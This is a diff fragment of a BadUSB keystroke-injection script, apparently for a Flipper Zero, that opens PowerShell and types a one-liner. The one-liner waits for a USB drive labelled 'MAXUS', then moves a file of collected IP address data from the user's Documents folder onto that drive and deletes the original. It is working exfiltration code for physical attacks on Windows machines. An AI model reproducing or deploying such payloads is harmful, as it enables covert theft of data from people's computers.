@@ -30,5 +30,8 @@ STRING powerShell
 DELAY 500
 ENTER
 DELAY 3000
+REM Title: Wait For Drive Example
+REM Author: emptythevoid
+REM Link: https://github.com/emptythevoid/flipperzero/blob/main/badusb/read-from-flipper-disk-image/wait-for-drive-example.txt
 STRING Register-WmiEvent -Class win32_VolumeChangeEvent -SourceIdentifier volumeChange;do{$newEvent = Wait-Event -SourceIdentifier volumeChange;$eventType = $newEvent.SourceEventArgs.NewEvent.EventType;if ($eventType -eq 2){$driveLetter = $newEvent.SourceEventArgs.NewEvent.DriveName;$driveLabel = ([wmi]"Win32_LogicalDisk='$driveLetter'").VolumeName;if ($driveLabel -eq 'MAXUS'){start-sleep -seconds 1;Move-Item -Path "C:\Users\$Env:UserName\Documents\IP_ADDRESS_$Env:UserName.txt" -Destination "D:\";Remove-Item "C:\Users\$Env:UserName\Documents\IP_ADDRESS_$Env:UserName.txt";exit;}};Remove-Event -SourceIdentifier volumeChange;} while (1-eq1);Unregister-Event -SourceIdentifier volumeChange
 ENTER
